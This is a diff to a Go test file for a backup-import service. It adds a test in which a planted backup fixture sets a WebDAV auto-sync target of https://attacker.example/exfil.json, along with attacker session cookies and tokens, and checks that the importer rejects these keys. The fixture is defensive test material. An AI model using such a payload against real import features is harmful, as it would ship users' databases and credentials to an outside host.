@@ -653,12 +653,12 @@ func TestImportTSV21NormalizesExplicitNullStats(t *testing.T) {
 	}
 
 	var site struct {
-		UseSystemProxy    sql.NullBool  `db:"use_system_proxy"`
-		IsPinned          sql.NullBool  `db:"is_pinned"`
-		SortOrder         sql.NullInt64 `db:"sort_order"`
+		UseSystemProxy    sql.NullBool    `db:"use_system_proxy"`
+		IsPinned          sql.NullBool    `db:"is_pinned"`
+		SortOrder         sql.NullInt64   `db:"sort_order"`
 		GlobalWeight      sql.NullFloat64 `db:"global_weight"`
-		ProbeEnabled      sql.NullBool  `db:"post_refresh_probe_enabled"`
-		ProbeLatencyThrMs sql.NullInt64 `db:"post_refresh_probe_latency_threshold_ms"`
+		ProbeEnabled      sql.NullBool    `db:"post_refresh_probe_enabled"`
+		ProbeLatencyThrMs sql.NullInt64   `db:"post_refresh_probe_latency_threshold_ms"`
 	}
 	if err := db.Get(&site, `SELECT use_system_proxy, is_pinned, sort_order, global_weight,
 		post_refresh_probe_enabled, post_refresh_probe_latency_threshold_ms FROM sites WHERE id = 1`); err != nil {
@@ -747,5 +747,88 @@ func TestImportTSV21NormalizesExplicitNullStats(t *testing.T) {
 	}
 	if balance.Valid {
 		t.Errorf("accounts.balance = %v, want NULL preserved", balance.Float64)
+	}
+}
+
+// maliciousTSV21Backup is a preferences-only payload planted with every
+// runtime-local credential/state key. backup_webdav_config_v1 is the P0
+// vector: once stored, the backup-webdav scheduler reads it at startup and
+// periodically ships the whole database to the attacker endpoint.
+const maliciousTSV21Backup = `{
+  "version": "2.1",
+  "timestamp": 1755678900000,
+  "preferences": {
+    "settings": [
+      {"key": "theme", "value": "dark"},
+      {"key": "backup_webdav_config_v1", "value": {"enabled": true, "fileUrl": "https://attacker.example/exfil.json", "username": "a", "password": "b", "exportType": "all", "autoSyncEnabled": true, "autoSyncCron": "0 * * * *"}},
+      {"key": "monitor_ldoh_cookie", "value": "ld_auth_session=attacker-session"},
+      {"key": "proxy_token", "value": "attacker-proxy-token"},
+      {"key": "account_credential_secret", "value": "attacker-master-key"},
+      {"key": "auth_token", "value": "attacker-admin-token"},
+      {"key": "backup_webdav_state_v1", "value": {"lastSyncAt": "2026-01-01"}}
+    ]
+  }
+}`
+
+func TestImportTSV21BlocksMaliciousRuntimeLocalSettings(t *testing.T) {
+	db := setupBackupServiceTestDB(t)
+
+	result, err := backupsvc.ImportTSV21(db, []byte(maliciousTSV21Backup))
+	if err != nil {
+		t.Fatalf("ImportTSV21: %v", err)
+	}
+	if result.SkippedSettings != 6 {
+		t.Fatalf("SkippedSettings = %d, want 6 (all runtime-local keys)", result.SkippedSettings)
+	}
+	if result.Imported["settings"] != 1 {
+		t.Fatalf("imported[settings] = %d, want 1 (only the benign key)", result.Imported["settings"])
+	}
+
+	for _, key := range []string{
+		"backup_webdav_config_v1",
+		"monitor_ldoh_cookie",
+		"proxy_token",
+		"account_credential_secret",
+		"auth_token",
+		"backup_webdav_state_v1",
+	} {
+		var count int
+		if err := db.Get(&count, "SELECT COUNT(*) FROM settings WHERE key = ?", key); err != nil {
+			t.Fatalf("count %s: %v", key, err)
+		}
+		if count != 0 {
+			t.Fatalf("runtime-local setting %s was imported", key)
+		}
+	}
+
+	// Benign keys must keep importing.
+	var theme string
+	if err := db.Get(&theme, "SELECT value FROM settings WHERE key = ?", "theme"); err != nil {
+		t.Fatalf("benign setting was not imported: %v", err)
+	}
+	if theme != `"dark"` {
+		t.Fatalf("settings[theme] = %q, want %q", theme, `"dark"`)
+	}
+}
+
+func TestImportTSV21ReportsNewDownstreamApiKeys(t *testing.T) {
+	db := setupBackupServiceTestDB(t)
+
+	first, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup))
+	if err != nil {
+		t.Fatalf("first ImportTSV21: %v", err)
+	}
+	// The sample carries one downstream key (name 客户端A / sk-downstream-1);
+	// only the name may surface, never the key value.
+	if len(first.NewDownstreamApiKeys) != 1 || first.NewDownstreamApiKeys[0] != "客户端A" {
+		t.Fatalf("first NewDownstreamApiKeys = %v, want [客户端A]", first.NewDownstreamApiKeys)
+	}
+
+	second, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup))
+	if err != nil {
+		t.Fatalf("second ImportTSV21: %v", err)
+	}
+	if len(second.NewDownstreamApiKeys) != 0 {
+		t.Fatalf("second NewDownstreamApiKeys = %v, want none (duplicate keys are not new)", second.NewDownstreamApiKeys)
 	}
 }
